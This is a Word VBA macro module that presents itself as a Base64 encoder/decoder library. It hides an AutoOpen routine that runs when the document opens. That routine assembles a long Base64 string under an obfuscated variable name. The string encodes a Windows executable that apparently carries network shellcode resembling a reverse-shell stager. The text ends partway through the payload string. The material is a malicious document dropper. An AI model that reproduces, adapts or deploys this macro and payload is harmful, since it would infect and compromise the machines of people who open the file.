Attribute VB_Name = "NewMacros"
' A Base64 Encoder/Decoder.
'
' This module is used to encode and decode data in Base64 format as described in RFC 1521.
'
' Home page: www.source-code.biz.
' Copyright 2007: Christian d'Heureuse, Inventec Informatik AG, Switzerland.
'
' This module is multi-licensed and may be used under the terms
' of any of the following licenses:
'
'  EPL, Eclipse Public License, V1.0 or later, http://www.eclipse.org/legal
'  LGPL, GNU Lesser General Public License, V2.1 or later, http://www.gnu.org/licenses/lgpl.html
'  GPL, GNU General Public License, V2 or later, http://www.gnu.org/licenses/gpl.html
'  AGPL, GNU Affero General Public License V3 or later, http://www.gnu.org/licenses/agpl.html
'  AL, Apache License, V2.0 or later, http://www.apache.org/licenses
'  BSD, BSD License, http://www.opensource.org/licenses/bsd-license.php
'  MIT, MIT License, http://www.opensource.org/licenses/MIT
'
' Please contact the author if you need another license.
' This module is provided "as is", without warranties of any kind.

Option Explicit

Private InitDone       As Boolean
Private Map1(0 To 63)  As Byte
Private Map2(0 To 127) As Byte

' Encodes a string into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   S         a String to be encoded.
' Returns:    a String with the Base64 encoded data.
Public Function Base64EncodeString(ByVal s As String) As String
   Base64EncodeString = Base64Encode(ConvertStringToBytes(s))
   End Function

' Encodes a byte array into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   InData    an array containing the data bytes to be encoded.
' Returns:    a string with the Base64 encoded data.
Public Function Base64Encode(InData() As Byte)
   Base64Encode = Base64Encode2(InData, UBound(InData) - LBound(InData) + 1)
   End Function

' Encodes a byte array into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   InData    an array containing the data bytes to be encoded.
'   InLen     number of bytes to process in InData.
' Returns:    a string with the Base64 encoded data.
Public Function Base64Encode2(InData() As Byte, ByVal InLen As Long) As String
   If Not InitDone Then Init
   If InLen = 0 Then Base64Encode2 = "": Exit Function
   Dim ODataLen As Long: ODataLen = (InLen * 4 + 2) \ 3     ' output length without padding
   Dim OLen As Long: OLen = ((InLen + 2) \ 3) * 4           ' output length including padding
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip0 As Long: ip0 = LBound(InData)
   Dim ip As Long
   Dim op As Long
   Do While ip < InLen
      Dim i0 As Byte: i0 = InData(ip0 + ip): ip = ip + 1
      Dim i1 As Byte: If ip < InLen Then i1 = InData(ip0 + ip): ip = ip + 1 Else i1 = 0
      Dim i2 As Byte: If ip < InLen Then i2 = InData(ip0 + ip): ip = ip + 1 Else i2 = 0
      Dim o0 As Byte: o0 = i0 \ 4
      Dim o1 As Byte: o1 = ((i0 And 3) * &H10) Or (i1 \ &H10)
      Dim o2 As Byte: o2 = ((i1 And &HF) * 4) Or (i2 \ &H40)
      Dim o3 As Byte: o3 = i2 And &H3F
      Out(op) = Map1(o0): op = op + 1
      Out(op) = Map1(o1): op = op + 1
      Out(op) = IIf(op < ODataLen, Map1(o2), Asc("=")): op = op + 1
      Out(op) = IIf(op < ODataLen, Map1(o3), Asc("=")): op = op + 1
      Loop
   Base64Encode2 = ConvertBytesToString(Out)
   End Function

' Decodes a string from Base64 format.
' Parameters:
'    s        a Base64 String to be decoded.
' Returns     a String containing the decoded data.
Public Function Base64DecodeString(ByVal s As String) As String
   If s = "" Then Base64DecodeString = "": Exit Function
   Base64DecodeString = ConvertBytesToString(Base64Decode(s))
   End Function

' Decodes a byte array from Base64 format.
' Parameters
'   s         a Base64 String to be decoded.
' Returns:    an array containing the decoded data bytes.
Public Function Base64Decode(ByVal s As String) As Byte()
   If Not InitDone Then Init
   Dim IBuf() As Byte: IBuf = ConvertStringToBytes(s)
   Dim ILen As Long: ILen = UBound(IBuf) + 1
   If ILen Mod 4 <> 0 Then Err.Raise vbObjectError, , "Length of Base64 encoded input string is not a multiple of 4."
   Do While ILen > 0
      If IBuf(ILen - 1) <> Asc("=") Then Exit Do
      ILen = ILen - 1
      Loop
   Dim OLen As Long: OLen = (ILen * 3) \ 4
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip As Long
   Dim op As Long
   Do While ip < ILen
      Dim i0 As Byte: i0 = IBuf(ip): ip = ip + 1
      Dim i1 As Byte: i1 = IBuf(ip): ip = ip + 1
      Dim i2 As Byte: If ip < ILen Then i2 = IBuf(ip): ip = ip + 1 Else i2 = Asc("A")
      Dim i3 As Byte: If ip < ILen Then i3 = IBuf(ip): ip = ip + 1 Else i3 = Asc("A")
      If i0 > 127 Or i1 > 127 Or i2 > 127 Or i3 > 127 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim b0 As Byte: b0 = Map2(i0)
      Dim b1 As Byte: b1 = Map2(i1)
      Dim b2 As Byte: b2 = Map2(i2)
      Dim b3 As Byte: b3 = Map2(i3)
      If b0 > 63 Or b1 > 63 Or b2 > 63 Or b3 > 63 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim o0 As Byte: o0 = (b0 * 4) Or (b1 \ &H10)
      Dim o1 As Byte: o1 = ((b1 And &HF) * &H10) Or (b2 \ 4)
      Dim o2 As Byte: o2 = ((b2 And 3) * &H40) Or b3
      Out(op) = o0: op = op + 1
      If op < OLen Then Out(op) = o1: op = op + 1
      If op < OLen Then Out(op) = o2: op = op + 1
      Loop
   Base64Decode = Out
   End Function

Private Sub Init()
   Dim c As Integer, i As Integer
   ' set Map1
   i = 0
   For c = Asc("A") To Asc("Z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("a") To Asc("z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("0") To Asc("9"): Map1(i) = c: i = i + 1: Next
   Map1(i) = Asc("+"): i = i + 1
   Map1(i) = Asc("/"): i = i + 1
   ' set Map2
   For i = 0 To 127: Map2(i) = 255: Next
   For i = 0 To 63: Map2(Map1(i)) = i: Next
   InitDone = True
   End Sub

Private Function ConvertStringToBytes(ByVal s As String) As Byte()
   Dim b1() As Byte: b1 = s
   Dim l As Long: l = (UBound(b1) + 1) \ 2
   If l = 0 Then ConvertStringToBytes = b1: Exit Function
   Dim b2() As Byte
   ReDim b2(0 To l - 1) As Byte
   Dim p As Long
   For p = 0 To l - 1
      Dim c As Long: c = b1(2 * p) + 256 * CLng(b1(2 * p + 1))
      If c >= 256 Then c = Asc("?")
      b2(p) = c
      Next
   ConvertStringToBytes = b2
   End Function

Private Function ConvertBytesToString(b() As Byte) As String
   Dim l As Long: l = UBound(b) - LBound(b) + 1
   Dim b2() As Byte
   ReDim b2(0 To (2 * l) - 1) As Byte
   Dim p0 As Long: p0 = LBound(b)
   Dim p As Long
   For p = 0 To l - 1: b2(2 * p) = b(p0 + p): Next
   Dim s As String: s = b2
   ConvertBytesToString = s
   End Function


Sub AutoOpen()
'
' AutoOpen |fffd||fffd|
'
Dim BzjVmHNXTFZsFi As String
Dim vData() As Byte
BzjVmHNXTFZsFi = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0K"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "JAAAAAAAAAAy4CG8doFP73aBT+92gU/vf/nc73yBT+9l507ucoFP72XnTO53gU/vZedK7mSBT+9l50vu"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "eoFP7xnlTu5zgU/vdoFO7yKBT+9L5kbudIFP70vmsO93gU/vS+ZN7neBT+9SaWNodoFP7wAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UEUAAEwBBQDfYdVdAAAAAAAAAADgAAIBCwEODgAWAAAAGAAAAAAAALYbAAAAEAAAADAAAAAAQAAAEAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAIAAAYAAAAAAAAABgAAAAAAAAAAcAAAAAQAAAAAAAACAECBAAAQAAAQAAAAABAAABAAAAAAAAAQAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAACMNgAAyAAAAABQAADgAQAAAAAAAAAAAAAAAAAAAAAAAABgAAC8AQAAkDEAAHAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAMgAAQAAAAAAAAAAAAAAAADAAACABAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAudGV4dAAAAMsVAAAAEAAAABYAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAC8DwAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ADAAAAAQAAAAGgAAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAkAMAAABAAAAAAgAAACoAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAEAAAMAucnNyYwAAAOABAAAAUAAAAAIAAAAsAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAC8AQAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AGAAAAACAAAALgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAFWL7IHsBAIAAKEAQEAAM8WJRfxWV8eFAP7///yQ6M7HhQT+//8AAACQx4UI/v//YJCJ5ceFDP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5C4AADHhRD+//8AAJBkx4UU/v//i1AwkMeFGP7//4tSDJDHhRz+//+LUhSQx4Ug/v//i3IokMeFJP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/w+3SibHhSj+//+QvwAAx4Us/v//AACQrMeFMP7//5A8YZDHhTT+//98BJAEx4U4/v//4JDBz8eFPP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/w2QAcfHhUD+//+Q4uyQx4VE/v//UpBXkMeFSP7//4tSEJDHhUz+//+LSjyQx4VQ/v//i0wReMeFVP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5DjcZDHhVj+//8B0ZBRx4Vc/v//kItZIMeFYP7//5AB05DHhWT+//+LSRiQx4Vo/v//41yQg8eFbP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/+kBkIvHhXD+//80i5ABx4V0/v//1pC/AMeFeP7//wAAAJDHhXz+//+skMHPx4WA/v//DZABx8eFhP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5A44JDHhYj+//918pADx4WM/v//ffiQO8eFkP7//30kkHXHhZT+///TkFiQx4WY/v//i1gkkMeFnP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/wHTkGbHhaD+//+LDEuQx4Wk/v//i1gckMeFqP7//wHTkIvHhaz+//8Ei5ABx4Ww/v//0JCJRMeFtP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/yQkkFvHhbj+//+QW5Bhx4W8/v//kFmQWseFwP7//5BRkP/HhcT+///gkF+Qx4XI/v//X5BakMeFzP7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/4sSkOnHhdD+//9M////x4XU/v//kF2QaMeF2P7//zMyAADHhdz+//+QaHdzx4Xg/v//Ml+QVMeF5P7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5BoTHfHhej+//8mB5CJx4Xs/v//6JD/0MeF8P7//5C4kAHHhfT+//8AAJApx4X4/v//xJBUkMeF/P7/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/1CQaCnHhQD///+AawCQx4UE/////9WQaseFCP///wqQaC/HhQz///9d6h2Qx4UQ////aAIAF8eFFP//"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/3GQiebHhRj///+QUJBQx4Uc////kFCQUMeFIP///5CDwAHHhST///+QUJCDx4Uo////wAGQUMeFLP//"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5Bo6g/HhTD////f4JD/x4U0////1ZCXkMeFOP///2oQkFbHhTz///+QV5Box4VA////maV0YceFRP//"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5D/1ZDHhUj///+FwJB0x4VM////DpD/TseFUP///wiQdeTHhVT///+Q6JMAx4VY////AACQaseFXP//"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/wCQagTHhWD///+QVpBXx4Vk////kGgC2ceFaP///8hfkP/HhWz////VkIP4x4Vw////AJB+TseFdP//"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/5CLNpDHhXj///9qQJBox4V8////ABAAAMdFgJBWkGrHRYQAkGhYx0WIpFPlkMdFjP/VkJPHRZCQU5Bq"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "x0WUAJBWkMdFmFOQV5DHRZxoAtnIx0WgX5D/1cdFpJCD+ADHRaiQfTeQx0WsWJBoAMdFsEAAAJDHRbRq"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AJBQx0W4kGgLL8dFvA8wkP/HRcDVkFeQx0XEaHVuTcdFyGGQ/9XHRcyQXpBex0XQkP8MJMdF1JAPhS/H"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "Rdj///+Qx0Xc6XT//8dF4P+QAcPHReSQKcaQx0XodamQw8dF7JC78LXHRfCiVpBqx0X0AJBTkGbHRfj/"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "1YvAakBoABAAAGj7AQAAagD/FQAwQACL+IvAi8CNtQD+//+Lzyv3uvoBAACLwIoEDo1JAYhB/4PqAXXw"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ib38/f///7X8/f//w4tN/DPNX17obgQAAIvlXcPMzMzMzMzMzMzMzFWL7IHsnAEAAKEAQEAAM8WJRfxW"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "V42FaP7//zP2UGgBAQAA/xWIMEAAhcB0Fv8VBDBAAFBoWDFAAOiyAAAAg8QI62X/FZAwQACL+P8VCDBA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AGoAagBqAGoBagNqAv8VjDBAAIP4/3UpaEAZQAD/FZQwQACLDUAwQABQ6HEBAACLyP8VZDBAAIvI/xVg"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "MEAA6xdqAVdQ/xWEMEAAaiz/FaAwQACDxASL8MeFZP7//wAQQACLhWT+//9Qw/8VgDBAAIX2dApW/xWc"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "MEAAg8QEi038M8BfM81e6IMDAACL5V3DuIBDQADDzMzMzMzMzMzMzFWL7IPk+FFWi3UIagH/FRQxQACD"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "xASNTQxRagBWUOjN/////3AE/zD/FRgxQACDxBhei+Vdw8zMzMzMzMzMzMxVi+xq/2hgJUAAZKEAAAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UFahAEBAADPFUI1F9GSjAAAAAIvx/xU8MEAAhMB1CIsO/xVUMEAAx0X8AAAAAIsOiwGLQASLTAg4hcl0"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "BYsB/1AIi030ZIkNAAAAAFlei+Vdw8zMzMzMzMzMzMzMzMzMVYvsav9ogCVAAGShAAAAAFChAEBAADPF"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UI1F9GSjAAAAAIsJiwGLQASLTAg4hcl0BYsB/1AIi030ZIkNAAAAAFmL5V3DzMzMzMzMzMzMzMxVi+xq"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/2iwJUAAZKEAAAAAUIPsJFNWV6EAQEAAM8VQjUX0ZKMAAAAAiWXwi9mJXeyLC8dF3AAAAACLQQQDw4lF"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "6It4JItwIIX/fBl/D4X2dBOF/3wPfwWD/hN2CIPuE4PfAOsOD1fAZg8TRdCLfdSLddCLQDiL0Yl94Ild"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "0IlV5IXAdBKLTeiLAItJOP9QBIsLi9GJTeTHRfwAAAAAi0EEA8OJReiLwYtd6IN7DACLXex1KItd6IvR"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "g3s8AItd7HQai33oi1Xki088i33gO8t0Cv8VWDBAAIsDi9CLSASLRBkMhcAPlEXUx0X8AQAAAIXAdAq5"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "BAAAAOngAAAAxkX8AotEGRQlwAEAAIP4QHQ4kIX/fDF/BIX2dCuLA4tIBIpEGUCLTBk4iEXg/3Xg/xVQ"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "MEAAg/j/dQWNSAXrYoPG/4PX/+vLixOLQgRqAGoTaHQxQACLTBg4/xVIMEAAg/gTdSyF0nUohf98M38E"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "hfZ0LYsDi0gEikQZQItMGTiIReD/deD/FVAwQACD+P91B7kEAAAA6wqDxv+D1//ryTPJiwOLQATHRBgg"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAAAMdEGCQAAAAA6yCLVexqAWoEiwKLSAQDyv8VXDBAALjQGEAAw4td7ItN3MdF/AEAAACLA2oAUYtI"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "BAPL/xVcMEAAx0X8BAAAAP8VPDBAAIt10ITAdQiLzv8VVDBAAMZF/AWLBotABItMMDiFyXQFiwH/UAiL"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "w4tN9GSJDQAAAABZX15bi+Vdw8zMzMzMzMzMzMzMzMxVi+xWi3UIagqLBotIBAPO/xVEMEAAD7bIUYvO"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "/xVMMEAAi87/FVgwQACLxl5dwzsNAEBAAPJ1AvLD8uloAgAAVmoB6DkLAADobwYAAFDoZAsAAOiPCwAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "i/DoVgYAAGoBiQbo6gMAAIPEDF6EwHRs2+LoawgAAGhOIkAA6IUFAADoMgYAAFDoAQsAAFlZhcB1Sugr"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "BgAA6HoGAACFwHQLaPUfQADo3QoAAFnoQgYAAOg9BgAA6BcGAADo9gUAAFDoFgsAAFnoAwYAAITAdAXo"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "vwoAAOjcBQAAM8DDagfoSwYAAMzoEAYAADPAw+icBwAA6L8FAABQ6OUKAABZw2oUaFA2QADoNggAAGoB"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "6AgDAABZhMAPhEYBAAAy24hd54Nl/ADovwIAAIhF3KFQQ0AAM8lBO8EPhCUBAACFwHVJiQ1QQ0AAaDwx"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "QABoMDFAAOhRCgAAWVmFwHQRx0X8/v///7j/AAAA6e8AAABoLDFAAGgkMUAA6CUKAABZWccFUENAAAIA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AADrBYrZiF3n/3Xc6PEDAABZ6IcFAACL8DP/OT50G1boUwMAAFmEwHQQV2oCV4s2i87/FSAxQAD/1uhl"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "BQAAi/A5PnQTVugtAwAAWYTAdAj/Nuj6CQAAWejiCQAAizjo1QkAAIvw6KoJAABQV/826Nj5//+DxAyL"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "8OhIBgAAhMB0YYTbdQXougkAAGoAagHoiwMAAFlZx0X8/v///4vG6zWLTeyLAYsAiUXgUVDoRQkAAFlZ"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "w4tl6OgJBgAAhMB0KIB95wB1Beh/CQAAx0X8/v///4tF4OgnBwAAw2oH6McEAABW6D4JAAD/deDoPAkA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AMzo7wMAAOl+/v//VYvsagD/FSwwQAD/dQj/FTAwQABoCQQAwP8VKDBAAFD/FSQwQABdw1WL7IHsJAMA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AGoX6FMJAACFwHQFagJZzSmjGEFAAIkNFEFAAIkVEEFAAIkdDEFAAIk1CEFAAIk9BEFAAGaMFTBBQABm"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "jA0kQUAAZowdAEFAAGaMBfxAQABmjCX4QEAAZowt9EBAAJyPBShBQACLRQCjHEFAAItFBKMgQUAAjUUI"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "oyxBQACLhdz8///HBWhAQAABAAEAoSBBQACjJEBAAMcFGEBAAAkEAMDHBRxAQAABAAAAxwUoQEAAAQAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AGoEWGvAAMeALEBAAAIAAABqBFhrwACLDQBAQACJTAX4agRYweAAiw0EQEAAiUwF+GhQMUAA6OH+//+L"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "5V3DVYvsi0UIVotIPAPID7dBFI1RGAPQD7dBBmvwKAPyO9Z0GYtNDDtKDHIKi0IIA0IMO8hyDIPCKDvW"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "deozwF5dw4vC6/lW6GoHAACFwHQgZKEYAAAAvlRDQACLUATrBDvQdBAzwIvK8A+xDoXAdfAywF7DsAFe"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "w1WL7IN9CAB1B8YFWENAAAHokAUAAOibAgAAhMB1BDLAXcPojgIAAITAdQpqAOiDAgAAWevpsAFdw1WL"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "7IPsDIA9TENAAAB0B7AB6YgAAABWi3UIhfZ0BYP+AXV/6N0GAACFwHQmhfZ1Img0Q0AA6GEHAABZhcB1"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "D2hAQ0AA6FIHAABZhcB0RjLA60uhAEBAAI119FeD4B+/NENAAGogWSvIg8j/08gzBQBAQACJRfSJRfiJ"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "RfylpaW/QENAAIlF9IlF+I119IlF/KWlpV/GBUxDQAABsAFei+Vdw2oF6DMCAADMaghocDZAAOg4BAAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "g2X8ALhNWgAAZjkFAABAAHVdoTwAQACBuAAAQABQRQAAdUy5CwEAAGY5iBgAQAB1PotFCLkAAEAAK8FQ"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "UehZ/v//WVmFwHQng3gkAHwhx0X8/v///7AB6x+LReyLADPJgTgFAADAD5TBi8HDi2Xox0X8/v///zLA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "6AEEAADDVYvs6MkFAACFwHQPgH0IAHUJM8C5VENAAIcBXcNVi+yAPVhDQAAAdAaAfQwAdRL/dQjoEQEA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AP91COgJAQAAWVmwAV3DVYvsoQBAQACLyDMFNENAAIPhH/91CNPIg/j/dQfoDAYAAOsLaDRDQADo+gUA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AFn32FkbwPfQI0UIXcNVi+z/dQjouv////fYWRvA99hIXcNVi+yD7BSDZfQAjUX0g2X4AFD/FRQwQACL"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "RfgzRfSJRfz/FRgwQAAxRfz/FQgwQAAxRfyNRexQ/xUcMEAAi0XwjU38M0XsM0X8M8GL5V3Diw0AQEAA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "Vle/TuZAu74AAP//O890BIXOdSbokv///4vIO891B7lP5kC76w6FznUKDRFHAADB4BALyIkNAEBAAPfR"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "X4kNBEBAAF7DM8DDM8BAw7gAQAAAw2hgQ0AA/xUQMEAAw7ABw2gAAAMAaAAAAQBqAOgdBQAAg8QMhcB1"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AcNqB+g9AAAAzMO4aENAAMPosvX//4tIBIMIBIlIBOjn////i0gEgwgCiUgEwzPAOQUMQEAAD5TAw7iM"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "Q0AAw7iIQ0AAw1WL7IHsJAMAAFNqF+jMBAAAhcB0BYtNCM0pagPoiwEAAMcEJMwCAACNhdz8//9qAFDo"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "CwQAAIPEDImFjP3//4mNiP3//4mVhP3//4mdgP3//4m1fP3//4m9eP3//2aMlaT9//9mjI2Y/f//Zoyd"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "dP3//2aMhXD9//9mjKVs/f//ZoytaP3//5yPhZz9//+LRQSJhZT9//+NRQSJhaD9///Hhdz8//8BAAEA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "i0D8alCJhZD9//+NRahqAFDogQMAAItFBIPEDMdFqBUAAEDHRawBAAAAiUW0/xUMMEAAagCNWP/3241F"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "qIlF+I2F3Pz//xrbiUX8/sP/FSwwQACNRfhQ/xUwMEAAhcB1DITbdQhqA+iWAAAAWVuL5V3DagD/FTQw"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "QACFwHQ0uU1aAABmOQh1KotIPAPIgTlQRQAAdR24CwEAAGY5QRh1EoN5dA52DIO56AAAAAB0A7ABwzLA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "w2jZIUAA/xUsMEAAw1WL7ItFCIsAgThjc23gdSWDeBADdR+LQBQ9IAWTGXQbPSEFkxl0FD0iBZMZdA09"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AECZAXQGM8BdwgQA6CwDAADMgyVwQ0AAAMNTVr58NUAAu3w1QAA783MZV4s+hf90CovP/xUgMUAA/9eD"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "xgQ783LpX15bw1NWvoQ1QAC7hDVAADvzcxlXiz6F/3QKi8//FSAxQAD/14PGBDvzculfXlvDzMzMzMzM"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "aNsiQABk/zUAAAAAi0QkEIlsJBCNbCQQK+BTVlehAEBAADFF/DPFUIll6P91+ItF/MdF/P7///+JRfiN"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "RfBkowAAAADyw4tN8GSJDQAAAABZX19eW4vlXVHyw1WL7P91FP91EP91DP91CGhvGUAAaABAQADovAEA"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AIPEGF3DVYvsgyV0Q0AAAIPsJFMz20MJHRBAQABqCugvAgAAhcAPhGwBAACDZfAAM8CDDRBAQAACM8lW"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "V4kddENAAI193FMPoovzW4kHiXcEiU8IM8mJVwyLRdyLfeSJRfSB9250ZWyLReg1aW5lSYlF+ItF4DVH"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "ZW51iUX8M8BAUw+ii/NbjV3ciQOLRfyJcwQLxwtF+IlLCIlTDHVDi0XcJfA//w89wAYBAHQjPWAGAgB0"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "HD1wBgIAdBU9UAYDAHQOPWAGAwB0Bz1wBgMAdRGLPXhDQACDzwGJPXhDQADrBos9eENAAIN99AeLReSJ"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "Rfx8MmoHWDPJUw+ii/NbjV3ciQOLRfyJcwSJSwiJUwyLXeD3wwACAAB0DoPPAok9eENAAOsDi13wX16p"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "AAAQAHRmgw0QQEAABMcFdENAAAIAAACpAAAACHROqQAAABB0RzPJDwHQiUXsiVXwi0Xsi03wg+AGg/gG"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "dS6hEEBAAIPICMcFdENAAAMAAACjEEBAAPbDIHQSg8ggxwV0Q0AABQAAAKMQQEAAM8Bbi+VdwzPAOQUU"
BzjVmHNXTFZsFi = BzjVmHNXTFZsFi & "QEAAD5XAw/8lbDBAAP8lcDBAAP8ldDBAAP8leDBAAP8l/DBAAP8l+DBAAP8ltDBAAP8lBDFAAP8l6DBA"
